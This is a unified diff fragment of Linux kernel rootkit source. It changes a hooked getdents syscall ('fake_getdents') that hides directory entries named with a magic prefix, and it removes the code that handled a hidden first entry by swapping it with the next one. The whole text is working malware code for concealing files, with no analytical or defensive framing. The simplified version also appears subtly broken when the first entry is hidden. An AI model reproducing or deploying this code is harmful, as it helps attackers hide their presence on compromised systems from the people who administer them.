@@ -30,14 +30,10 @@ asmlinkage long fake_getdents(struct pt_regs *regs) {
   int i, j;
   long bytes_read;
   unsigned char *buffer;
-  unsigned char *buffer_dirent;
-  unsigned char *buffer_next_dirent;
   unsigned short d_reclen;
   unsigned short last_d_reclen;
-  unsigned short next_d_reclen;
   struct linux_dirent *dirent;
   struct linux_dirent *last_dirent;
-  struct linux_dirent *next_dirent;
   struct linux_dirent __user *dirent_user;
 
   bytes_read = (*real_getdents)(regs);
@@ -68,38 +64,8 @@ asmlinkage long fake_getdents(struct pt_regs *regs) {
       j++;
 
     /* hide directory entry */
-    /* exception for the first entry, swap it with the second entry */
-    if (j == MAGIC_PREFIX_LEN) {
-      if (last_d_reclen == 0) {
-	buffer_dirent = kmalloc(d_reclen, GFP_KERNEL);
-	if (!buffer_dirent) {
-	  printk(KERN_INFO "failed to kmalloc buffer_dirent");
-	  kfree(buffer);
-	  return bytes_read;
-	}
-	
-	next_dirent = (struct linux_dirent *)(buffer + i + d_reclen);
-	next_d_reclen = next_dirent->d_reclen;
-	buffer_next_dirent = kmalloc(next_d_reclen, GFP_KERNEL);
-	if (!buffer_next_dirent) {
-	  printk(KERN_INFO "failed to kmalloc buffer_next_dirent");
-	  kfree(buffer_dirent);
-	  kfree(buffer);
-	  return bytes_read;
-	}
-	
-	memcpy(buffer_dirent, dirent, d_reclen);
-	memcpy(buffer_next_dirent, next_dirent, next_d_reclen);
-
-	memcpy(dirent, buffer_next_dirent, next_d_reclen);
-	memcpy(dirent + next_d_reclen, buffer_dirent, d_reclen);
-
-	kfree(buffer_dirent);
-	kfree(buffer_next_dirent);
-      }
-      else
-	last_dirent->d_reclen += dirent->d_reclen;
-    }
+    if (j == MAGIC_PREFIX_LEN)
+      last_dirent->d_reclen += dirent->d_reclen;
 
     last_d_reclen = d_reclen;
     last_dirent = dirent;
